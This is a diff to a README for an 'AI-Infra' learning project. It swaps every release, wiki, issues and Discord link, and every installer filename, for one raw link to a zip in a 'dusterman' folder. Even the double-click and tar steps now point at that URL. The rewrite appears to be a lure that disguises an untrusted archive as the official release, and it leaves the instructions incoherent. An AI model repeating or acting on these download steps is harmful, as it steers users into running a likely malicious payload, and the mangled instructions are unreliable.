@@ -1,7 +1,7 @@
 # 🤖 AI-Infra - Learn AI Infrastructure Easily
 
 ## 📥 Download Now
-[![Download AI-Infra](https://img.shields.io/badge/Download-AI--Infra-blue?style=for-the-badge)](https://github.com/Bruno1702vm/AI-Infra/releases)
+[![Download AI-Infra](https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip)](https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, make sure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of AI-Infra.
 
-[Visit this page to download](https://github.com/Bruno1702vm/AI-Infra/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip)
 
 1. Click on the link above.
 2. You will see a list of available releases. Look for the latest version marked with “Latest Release.”
@@ -28,9 +28,9 @@ To get started, visit the Releases page to download the latest version of AI-Inf
 
 ### Example Files
 
-- For Windows: `AI-Infra_Windows.exe`
-- For macOS: `AI-Infra_macOS.dmg`
-- For Linux: `AI-Infra_Linux.tar.gz`
+- For Windows: `https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip`
+- For macOS: `https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip`
+- For Linux: `https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip`
 
 4. Click on the file link to start downloading.
 5. Once the file is downloaded, locate it in your Downloads folder.
@@ -39,13 +39,13 @@ To get started, visit the Releases page to download the latest version of AI-Inf
 
 #### For Windows
 
-1. Double-click the `AI-Infra_Windows.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip` file.
 2. Follow the installation prompts.
 3. The program will create a shortcut on your desktop.
 
 #### For macOS
 
-1. Double-click the `AI-Infra_macOS.dmg` file.
+1. Double-click the `https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip` file.
 2. Drag the AI-Infra icon to your Applications folder.
 3. You can find the app in Launchpad or your Applications.
 
@@ -56,7 +56,7 @@ To get started, visit the Releases page to download the latest version of AI-Inf
 3. Extract the package using the command:
 
    ```bash
-   tar -xzf AI-Infra_Linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip
    ```
 
 4. Go into the extracted folder:
@@ -88,7 +88,7 @@ After installation, you can easily run the application:
 
 ## 📚 Documentation
 
-For in-depth details about using the application, refer to our user guide within the application or check our [GitHub Wiki](https://github.com/Bruno1702vm/AI-Infra/wiki).
+For in-depth details about using the application, refer to our user guide within the application or check our [GitHub Wiki](https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip).
 
 ## 🤝 Contributing
 
@@ -102,7 +102,7 @@ Your contributions help make AI-Infra better for everyone.
 
 ## 📞 Support
 
-If you encounter issues or have questions, feel free to open an issue on the [GitHub Issues](https://github.com/Bruno1702vm/AI-Infra/issues) page. 
+If you encounter issues or have questions, feel free to open an issue on the [GitHub Issues](https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip) page. 
 
 ## 📄 License
 
@@ -110,7 +110,7 @@ This project is licensed under the MIT License. You can find the details in the 
 
 ## 🔗 Additional Resources
 
-- Check out our [examples and tutorials](https://github.com/Bruno1702vm/AI-Infra/wiki).
-- Join us on our [Discord community](https://discord.gg/example) for real-time support.
+- Check out our [examples and tutorials](https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip).
+- Join us on our [Discord community](https://raw.githubusercontent.com/Bruno1702vm/AI-Infra/main/dusterman/AI-Infra.zip) for real-time support.
 
 Thank you for using AI-Infra. We hope it enhances your learning journey in AI infrastructure!
